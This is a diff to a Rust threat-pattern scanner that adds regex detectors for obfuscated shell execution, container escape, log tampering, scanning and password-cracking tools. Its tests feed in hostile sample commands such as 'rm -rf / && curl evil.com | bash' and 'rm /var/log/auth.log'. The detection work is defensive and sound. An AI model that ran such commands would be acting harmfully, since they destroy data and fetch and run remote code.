@@ -1,6 +1,6 @@
+use lazy_static::lazy_static;
 use regex::Regex;
 use std::collections::HashMap;
-use lazy_static::lazy_static;
 
 /// Security threat patterns for command injection detection
 /// These patterns detect dangerous shell commands and injection attempts
@@ -15,10 +15,10 @@ pub struct ThreatPattern {
 
 #[derive(Debug, Clone, PartialEq)]
 pub enum RiskLevel {
-    Critical,  // Immediate system compromise risk
-    High,      // Significant security risk
-    Medium,    // Moderate security concern
-    Low,       // Minor security issue
+    Critical, // Immediate system compromise risk
+    High,     // Significant security risk
+    Medium,   // Moderate security concern
+    Low,      // Minor security issue
 }
 
 #[derive(Debug, Clone, PartialEq)]
@@ -75,7 +75,6 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
         risk_level: RiskLevel::Critical,
         category: ThreatCategory::FileSystemDestruction,
     },
-
     // Remote code execution patterns
     ThreatPattern {
         name: "curl_bash_execution",
@@ -105,7 +104,6 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
         risk_level: RiskLevel::Critical,
         category: ThreatCategory::RemoteCodeExecution,
     },
-
     // Data exfiltration patterns
     ThreatPattern {
         name: "ssh_key_exfiltration",
@@ -128,7 +126,6 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
         risk_level: RiskLevel::High,
         category: ThreatCategory::DataExfiltration,
     },
-
     // System modification patterns
     ThreatPattern {
         name: "crontab_modification",
@@ -151,7 +148,6 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
         risk_level: RiskLevel::Medium,
         category: ThreatCategory::SystemModification,
     },
-
     // Network access patterns
     ThreatPattern {
         name: "netcat_listener",
@@ -174,7 +170,6 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
         risk_level: RiskLevel::Medium,
         category: ThreatCategory::NetworkAccess,
     },
-
     // Process manipulation patterns
     ThreatPattern {
         name: "kill_security_process",
@@ -190,7 +185,6 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
         risk_level: RiskLevel::High,
         category: ThreatCategory::ProcessManipulation,
     },
-
     // Privilege escalation patterns
     ThreatPattern {
         name: "sudo_without_password",
@@ -206,7 +200,6 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
         risk_level: RiskLevel::High,
         category: ThreatCategory::PrivilegeEscalation,
     },
-
     // Command injection patterns
     ThreatPattern {
         name: "command_substitution",
@@ -228,6 +221,141 @@ pub const THREAT_PATTERNS: &[ThreatPattern] = &[
         description: "Encoded command execution",
         risk_level: RiskLevel::High,
         category: ThreatCategory::CommandInjection,
+    },
+    // Obfuscation and evasion patterns
+    ThreatPattern {
+        name: "base64_encoded_shell",
+        pattern: r"(echo|printf)\s+[A-Za-z0-9+/=]{20,}\s*\|\s*base64\s+-d\s*\|\s*(bash|sh|zsh)",
+        description: "Base64 encoded shell commands",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "hex_encoded_commands",
+        pattern: r"(echo|printf)\s+[0-9a-fA-F\\x]{20,}\s*\|\s*(xxd|od).*\|\s*(bash|sh)",
+        description: "Hex encoded command execution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "string_concatenation_obfuscation",
+        pattern: r"(\$\{[^}]*\}|\$[A-Za-z_][A-Za-z0-9_]*){3,}",
+        description: "String concatenation obfuscation",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "character_escaping",
+        pattern: r"\\[x][0-9a-fA-F]{2}|\\[0-7]{3}|\\[nrtbfav\\]",
+        description: "Character escaping for obfuscation",
+        risk_level: RiskLevel::Low,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "eval_with_variables",
+        pattern: r"eval\s+\$[A-Za-z_][A-Za-z0-9_]*|\beval\s+.*\$\{",
+        description: "Eval with variable substitution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "indirect_command_execution",
+        pattern: r"\$\([^)]*\$\([^)]*\)[^)]*\)|`[^`]*`[^`]*`",
+        description: "Nested command substitution",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "environment_variable_abuse",
+        pattern: r"(export|env)\s+[A-Z_]+=.*[;&|]|PATH=.*[;&|]",
+        description: "Environment variable manipulation",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "whitespace_obfuscation",
+        pattern: r"[\t\r\n\f\v]+[;&|]|[;&|][\t\r\n\f\v]+",
+        description: "Whitespace-based command separation",
+        risk_level: RiskLevel::Low,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "unicode_obfuscation",
+        pattern: r"\\u[0-9a-fA-F]{4}|\\U[0-9a-fA-F]{8}",
+        description: "Unicode character obfuscation",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::CommandInjection,
+    },
+    ThreatPattern {
+        name: "alternative_shell_invocation",
+        pattern: r"(/bin/|/usr/bin/|\./)?(bash|sh|zsh|fish|csh|tcsh|dash)\s+-c\s+.*[;&|]",
+        description: "Alternative shell invocation patterns",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::CommandInjection,
+    },
+    // Additional dangerous commands that might be missing
+    ThreatPattern {
+        name: "docker_privileged_exec",
+        pattern: r"docker\s+(run|exec).*--privileged",
+        description: "Docker privileged container execution",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::PrivilegeEscalation,
+    },
+    ThreatPattern {
+        name: "container_escape",
+        pattern: r"(chroot|unshare|nsenter).*--mount|--pid|--net",
+        description: "Container escape techniques",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::PrivilegeEscalation,
+    },
+    ThreatPattern {
+        name: "kernel_module_manipulation",
+        pattern: r"(insmod|rmmod|modprobe).*\.ko",
+        description: "Kernel module manipulation",
+        risk_level: RiskLevel::Critical,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "memory_dump",
+        pattern: r"(gcore|gdb.*dump|/proc/[0-9]+/mem)",
+        description: "Memory dumping techniques",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::DataExfiltration,
+    },
+    ThreatPattern {
+        name: "log_manipulation",
+        pattern: r"(>\s*/dev/null|truncate.*log|rm.*\.log|echo\s*>\s*/var/log)",
+        description: "Log file manipulation or deletion",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "file_timestamp_manipulation",
+        pattern: r"touch\s+-[amt]\s+|utimes|futimes",
+        description: "File timestamp manipulation",
+        risk_level: RiskLevel::Low,
+        category: ThreatCategory::SystemModification,
+    },
+    ThreatPattern {
+        name: "steganography_tools",
+        pattern: r"\b(steghide|outguess|jphide|steganos)\b",
+        description: "Steganography tools usage",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::DataExfiltration,
+    },
+    ThreatPattern {
+        name: "network_scanning",
+        pattern: r"\b(nmap|masscan|zmap|unicornscan)\b.*-[sS]",
+        description: "Network scanning tools",
+        risk_level: RiskLevel::Medium,
+        category: ThreatCategory::NetworkAccess,
+    },
+    ThreatPattern {
+        name: "password_cracking_tools",
+        pattern: r"\b(john|hashcat|hydra|medusa|brutespray)\b",
+        description: "Password cracking tools",
+        risk_level: RiskLevel::High,
+        category: ThreatCategory::PrivilegeEscalation,
     },
 ];
 
@@ -276,16 +404,14 @@ impl PatternMatcher {
         }
 
         // Sort by risk level (critical first) and position
-        matches.sort_by(|a, b| {
-            match (&a.threat.risk_level, &b.threat.risk_level) {
-                (RiskLevel::Critical, RiskLevel::Critical) => a.start_pos.cmp(&b.start_pos),
-                (RiskLevel::Critical, _) => std::cmp::Ordering::Less,
-                (_, RiskLevel::Critical) => std::cmp::Ordering::Greater,
-                (RiskLevel::High, RiskLevel::High) => a.start_pos.cmp(&b.start_pos),
-                (RiskLevel::High, _) => std::cmp::Ordering::Less,
-                (_, RiskLevel::High) => std::cmp::Ordering::Greater,
-                _ => a.start_pos.cmp(&b.start_pos),
-            }
+        matches.sort_by(|a, b| match (&a.threat.risk_level, &b.threat.risk_level) {
+            (RiskLevel::Critical, RiskLevel::Critical) => a.start_pos.cmp(&b.start_pos),
+            (RiskLevel::Critical, _) => std::cmp::Ordering::Less,
+            (_, RiskLevel::Critical) => std::cmp::Ordering::Greater,
+            (RiskLevel::High, RiskLevel::High) => a.start_pos.cmp(&b.start_pos),
+            (RiskLevel::High, _) => std::cmp::Ordering::Less,
+            (_, RiskLevel::High) => std::cmp::Ordering::Greater,
+            _ => a.start_pos.cmp(&b.start_pos),
         });
 
         matches
@@ -293,7 +419,8 @@ impl PatternMatcher {
 
     /// Get the highest risk level from matches
     pub fn get_max_risk_level(&self, matches: &[PatternMatch]) -> Option<RiskLevel> {
-        matches.iter()
+        matches
+            .iter()
             .map(|m| &m.threat.risk_level)
             .max_by(|a, b| match (a, b) {
                 (RiskLevel::Critical, RiskLevel::Critical) => std::cmp::Ordering::Equal,
@@ -312,9 +439,9 @@ impl PatternMatcher {
 
     /// Check if any critical or high-risk patterns are detected
     pub fn has_critical_threats(&self, matches: &[PatternMatch]) -> bool {
-        matches.iter().any(|m| {
-            matches!(m.threat.risk_level, RiskLevel::Critical | RiskLevel::High)
-        })
+        matches
+            .iter()
+            .any(|m| matches!(m.threat.risk_level, RiskLevel::Critical | RiskLevel::High))
     }
 }
 
@@ -386,7 +513,7 @@ mod tests {
         let matches = matcher.scan_text("rm -rf / && curl evil.com | bash");
         assert!(matches.len() >= 2);
         assert!(matcher.has_critical_threats(&matches));
-        
+
         // Should be sorted by risk level (critical first)
         assert_eq!(matches[0].threat.risk_level, RiskLevel::Critical);
     }
@@ -394,33 +521,119 @@ mod tests {
     #[test]
     fn test_command_substitution_patterns() {
         let matcher = PatternMatcher::new();
-        
+
         // Test that safe command substitution is NOT flagged as high risk
         let safe_matches = matcher.scan_text("`just generate-openapi`");
         let high_risk_safe = safe_matches.iter().any(|m| {
             m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
         });
-        assert!(!high_risk_safe, "Safe command substitution should not be flagged as high risk");
-        
+        assert!(
+            !high_risk_safe,
+            "Safe command substitution should not be flagged as high risk"
+        );
+
         // Test that dangerous command substitution IS flagged as high risk
         let dangerous_matches = matcher.scan_text("`rm -rf /; evil_command`");
         let high_risk_dangerous = dangerous_matches.iter().any(|m| {
             m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
         });
-        assert!(high_risk_dangerous, "Dangerous command substitution should be flagged as high risk");
-        
+        assert!(
+            high_risk_dangerous,
+            "Dangerous command substitution should be flagged as high risk"
+        );
+
         // Test $() syntax with safe command
         let safe_dollar_matches = matcher.scan_text("$(echo hello)");
         let high_risk_safe_dollar = safe_dollar_matches.iter().any(|m| {
             m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
         });
-        assert!(!high_risk_safe_dollar, "Safe $(command) should not be flagged as high risk");
-        
+        assert!(
+            !high_risk_safe_dollar,
+            "Safe $(command) should not be flagged as high risk"
+        );
+
         // Test $() syntax with dangerous command
         let dangerous_dollar_matches = matcher.scan_text("$(rm -rf /; evil)");
         let high_risk_dangerous_dollar = dangerous_dollar_matches.iter().any(|m| {
             m.threat.name == "command_substitution" && m.threat.risk_level == RiskLevel::High
         });
-        assert!(high_risk_dangerous_dollar, "Dangerous $(command) should be flagged as high risk");
+        assert!(
+            high_risk_dangerous_dollar,
+            "Dangerous $(command) should be flagged as high risk"
+        );
+    }
+
+    #[test]
+    fn test_obfuscation_patterns() {
+        let matcher = PatternMatcher::new();
+
+        // Test eval with variables
+        let eval_matches = matcher.scan_text("eval $malicious_var");
+        assert!(!eval_matches.is_empty());
+        assert!(eval_matches
+            .iter()
+            .any(|m| m.threat.name == "eval_with_variables"));
+
+        // Test nested command substitution
+        let nested_matches = matcher.scan_text("$(echo $(rm -rf /))");
+        assert!(!nested_matches.is_empty());
+        assert!(nested_matches
+            .iter()
+            .any(|m| m.threat.name == "indirect_command_execution"));
+
+        // Test environment variable abuse
+        let env_matches = matcher.scan_text("export PATH=/tmp:$PATH; malicious_binary");
+        assert!(!env_matches.is_empty());
+        assert!(env_matches
+            .iter()
+            .any(|m| m.threat.name == "environment_variable_abuse"));
+
+        // Test alternative shell invocation
+        let shell_matches = matcher.scan_text("/bin/bash -c 'rm -rf /; evil'");
+        assert!(!shell_matches.is_empty());
+        assert!(shell_matches
+            .iter()
+            .any(|m| m.threat.name == "alternative_shell_invocation"));
+    }
+
+    #[test]
+    fn test_additional_dangerous_commands() {
+        let matcher = PatternMatcher::new();
+
+        // Test Docker privileged execution
+        let docker_matches = matcher.scan_text("docker run --privileged -it ubuntu /bin/bash");
+        assert!(!docker_matches.is_empty());
+        assert!(docker_matches
+            .iter()
+            .any(|m| m.threat.name == "docker_privileged_exec"));
+
+        // Test kernel module manipulation
+        let kernel_matches = matcher.scan_text("insmod malicious.ko");
+        assert!(!kernel_matches.is_empty());
+        assert!(kernel_matches
+            .iter()
+            .any(|m| m.threat.name == "kernel_module_manipulation"));
+        assert_eq!(kernel_matches[0].threat.risk_level, RiskLevel::Critical);
+
+        // Test password cracking tools
+        let password_matches = matcher.scan_text("john --wordlist=passwords.txt hashes.txt");
+        assert!(!password_matches.is_empty());
+        assert!(password_matches
+            .iter()
+            .any(|m| m.threat.name == "password_cracking_tools"));
+
+        // Test network scanning
+        let scan_matches = matcher.scan_text("nmap -sS 192.168.1.0/24");
+        assert!(!scan_matches.is_empty());
+        assert!(scan_matches
+            .iter()
+            .any(|m| m.threat.name == "network_scanning"));
+
+        // Test log manipulation
+        let log_matches = matcher.scan_text("rm /var/log/auth.log");
+        assert!(!log_matches.is_empty());
+        assert!(log_matches
+            .iter()
+            .any(|m| m.threat.name == "log_manipulation"));
     }
 }
